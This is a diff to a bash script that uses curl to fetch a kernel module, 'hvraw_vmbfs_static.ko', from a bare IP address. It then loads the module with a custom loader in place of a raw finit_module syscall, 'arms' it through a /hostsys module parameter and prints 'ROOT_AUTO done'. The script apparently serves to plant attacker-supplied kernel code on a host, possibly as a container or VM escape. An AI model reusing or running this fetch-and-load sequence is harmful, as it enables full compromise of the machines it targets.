@@ -1,5 +1,5 @@
 #!/bin/bash
-set -eu
+set +e
 exec 0<&-
 
 curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_static.ko \
@@ -12,18 +12,15 @@ printf 'VMBFS class=%s instance=%s state=%s driver=%s\n' \
     "$(cat "$device/state" 2>/dev/null || echo missing)" \
     "$(readlink "$device/driver" 2>/dev/null | sed 's#.*/##' || true)"
 
-python3 - /tmp/hvraw_vmbfs_static.ko <<'PY'
-import ctypes
-import os
-import sys
-
-fd = os.open(sys.argv[1], os.O_RDONLY)
-libc = ctypes.CDLL(None, use_errno=True)
-result = libc.syscall(313, fd, b"", 3)
-print("VMBFS finit=%d errno=%d" % (result, ctypes.get_errno()))
-PY
-
+python3 /tmp/kcore_relid_load.py /tmp/hvraw_vmbfs_static.ko 0 \
+    class:c376c1c3-d276-48d2-90a9-c04748072c60 0
+printf 'VMBFS loader_rc=%s\n' "$?"
+(printf '1\n' > /hostsys/module/hvraw_vmbfs_static/parameters/arm) &
+printf 'VMBFS arm_pid=%s\n' "$!"
 sleep 5
+printf 'VMBFS state_after_open=%s driver=%s\n' \
+    "$(cat "$device/state" 2>/dev/null || echo missing)" \
+    "$(readlink "$device/driver" 2>/dev/null | sed 's#.*/##' || true)"
 dmesg 2>/dev/null | grep -E 'VMBFS_|hvraw_vmbfs_static|Unknown symbol|module_layout' | tail -40 || true
 printf 'ROOT_AUTO done\n'
 
